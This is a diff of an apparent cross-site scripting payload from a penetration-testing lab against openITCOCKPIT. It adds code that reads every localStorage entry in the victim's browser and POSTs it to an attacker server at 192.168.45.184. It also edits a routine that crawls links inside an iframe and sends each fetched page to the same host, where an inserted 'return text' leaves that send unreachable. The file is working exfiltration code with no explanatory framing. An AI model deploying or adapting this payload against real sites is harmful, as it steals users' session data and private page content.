@@ -113,9 +113,29 @@ validURL = (url) => {
     return true;
 }
 
+// sendCookiesXX = () => {
+//     fetch("https://192.168.45.184/save_cookies", {
+//         body: "name=" + "https://openitcockpit/js/vendor/lodash/perf/index.html" + "&value=" + encodeURIComponent(localStorage),
+//         headers: {"Content-Type": "application/x-www-form-urlencoded"},
+//         method: "POST";
+//     });
+// };
+
 actions = () => {
     setTimeout(() => {
+        Object.keys(localStorage).forEach(key => {
+            fetch("https://192.168.45.184/save_cookies", {
+                body: "name=" + encodeURIComponent(key) + "&value=" + encodeURIComponent(localStorage.getItem(key)),
+                headers: {"Content-Type": "application/x-www-form-urlencoded"},
+                method: "POST"
+            });
+        })
+    }, 2000); // Leave time for page to load
+
+    setTimeout(() => {
+
         var allA = iframe.contentDocument.getElementsByTagName("a");
+
         var allHrefs = [];
         for (var i=0;i<allA.length; i++){ // Adds all links into array
             allHrefs.push(allA[i].href);
@@ -127,7 +147,7 @@ actions = () => {
                 validHrefs.push(uniqueHrefs[i]);
             }
         }
-        // Run the request asynchronously to ensure it won't freeze up user's browser
+        // Run the request asynchronously to ensure it won't freez   e up user's browser
         validHrefs.forEach(href => {
             console.log("Attempting " + href)
             fetch(href, {
@@ -136,7 +156,8 @@ actions = () => {
             }).then((response) => {
                 return response.text();
             }).then((text) => {
-                fetch("https://192.168.45.225/save_page", {
+                return text
+                fetch("https://192.168.45.184/save_page", {
                     body: "url=" + encodeURIComponent(href) + "&content=" + encodeURIComponent(text),
                     headers: {"Content-Type": "application/x-www-form-urlencoded"},
                     method: "POST"
